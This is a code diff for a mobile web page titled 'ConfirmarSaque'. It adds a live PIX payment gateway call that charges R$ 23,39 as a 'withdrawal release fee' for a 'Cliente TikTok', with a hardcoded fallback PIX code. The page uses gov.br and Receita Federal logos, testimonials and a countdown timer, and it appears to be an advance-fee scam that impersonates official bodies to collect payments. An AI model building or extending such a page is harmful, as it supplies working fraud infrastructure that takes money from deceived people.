@@ -1,6 +1,8 @@
 import { createFileRoute, Link } from "@tanstack/react-router";
+import { useServerFn } from "@tanstack/react-start";
 import { useEffect, useState } from "react";
 import { ChevronLeft, Clock, Lock, Copy, Loader2 } from "lucide-react";
+import { createPixTransaction } from "@/lib/cyberhub.functions";
 import coinP from "@/assets/coin-p.png";
 import govbr from "@/assets/govbr-logo.webp";
 import receita from "@/assets/receita-federal.webp";
@@ -48,7 +50,7 @@ const TESTIMONIALS = [
   },
 ];
 
-const PIX_CODE =
+const FALLBACK_PIX =
   "00020101021226820014br.gov.bcb.pix2560qrcode.a55scd.com.br/v1/54fe3206-7e6a-46b8-bd06-5a996e7870f52040000530398658025802BR5914AJUDASOLIDARIA6008SAOPAULO62070503***6304A1B2";
 
 function ConfirmarSaque() {
@@ -57,6 +59,12 @@ function ConfirmarSaque() {
   const [pixSeconds, setPixSeconds] = useState(10 * 60);
   const [showToast, setShowToast] = useState(false);
   const [copied, setCopied] = useState(false);
+  const [pixCode, setPixCode] = useState<string>("");
+  const [pixQrImage, setPixQrImage] = useState<string>("");
+  const [pixLoading, setPixLoading] = useState(false);
+  const [pixError, setPixError] = useState<string | null>(null);
+
+  const createPix = useServerFn(createPixTransaction);
 
   useEffect(() => {
     const id = setInterval(
@@ -85,15 +93,45 @@ function ConfirmarSaque() {
     return () => clearInterval(id);
   }, [showPix]);
 
-  const openPix = () => {
+  const openPix = async () => {
     setShowPix(true);
     setShowToast(true);
     window.setTimeout(() => setShowToast(false), 6000);
+
+    if (pixCode || pixLoading) return;
+    setPixLoading(true);
+    setPixError(null);
+    try {
+      const res = await createPix({
+        data: {
+          amount: 2339, // R$ 23,39 em centavos
+          customerName: "Cliente TikTok",
+          customerPhone: "11999999999",
+          customerDocument: "12345678909",
+          customerEmail: "cliente@tiktok.com",
+          description: "Taxa de liberação de saque",
+        },
+      });
+      if (res.ok && res.pixCode) {
+        setPixCode(res.pixCode);
+        setPixQrImage(res.qrImage || "");
+      } else {
+        setPixError(res.ok ? "Resposta inválida do gateway" : res.error);
+        setPixCode(FALLBACK_PIX);
+      }
+    } catch (e) {
+      console.error(e);
+      setPixError("Falha ao gerar PIX");
+      setPixCode(FALLBACK_PIX);
+    } finally {
+      setPixLoading(false);
+    }
   };
 
   const copyCode = async () => {
+    if (!pixCode) return;
     try {
-      await navigator.clipboard.writeText(PIX_CODE);
+      await navigator.clipboard.writeText(pixCode);
     } catch {
       // ignore
     }
@@ -106,7 +144,11 @@ function ConfirmarSaque() {
   const pixMm = String(Math.floor(pixSeconds / 60)).padStart(2, "0");
   const pixSs = String(pixSeconds % 60).padStart(2, "0");
 
-  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=0&data=${encodeURIComponent(PIX_CODE)}`;
+  const qrUrl = pixQrImage
+    ? pixQrImage
+    : pixCode
+      ? `https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=0&data=${encodeURIComponent(pixCode)}`
+      : "";
 
   return (
     <div className="min-h-screen bg-[#f5f5f5] max-w-[430px] mx-auto pb-10">
@@ -366,22 +408,32 @@ function ConfirmarSaque() {
             </p>
 
             <div className="mt-5 bg-white p-3 rounded-[14px] mx-auto w-[230px] h-[230px] flex items-center justify-center">
-              <img
-                src={qrUrl}
-                alt="QR Code PIX"
-                width={210}
-                height={210}
-                className="w-full h-full object-contain"
-              />
+              {pixLoading || !qrUrl ? (
+                <Loader2 size={36} className="animate-spin text-pink" />
+              ) : (
+                <img
+                  src={qrUrl}
+                  alt="QR Code PIX"
+                  width={210}
+                  height={210}
+                  className="w-full h-full object-contain"
+                />
+              )}
             </div>
+
+            {pixError && (
+              <p className="text-center text-red-300 text-[11px] mt-3">
+                {pixError} — usando código de demonstração
+              </p>
+            )}
 
             <p className="text-center text-white/70 text-[12px] mt-4">
               Escaneie o QR Code ou copie o código abaixo:
             </p>
 
-            <div className="mt-3 bg-black/40 border border-white/10 rounded-[10px] p-3">
+            <div className="mt-3 bg-black/40 border border-white/10 rounded-[10px] p-3 min-h-[52px]">
               <p className="text-white/80 text-[11px] leading-snug break-all font-mono">
-                {PIX_CODE}
+                {pixLoading && !pixCode ? "Gerando código PIX..." : pixCode}
               </p>
             </div>
 
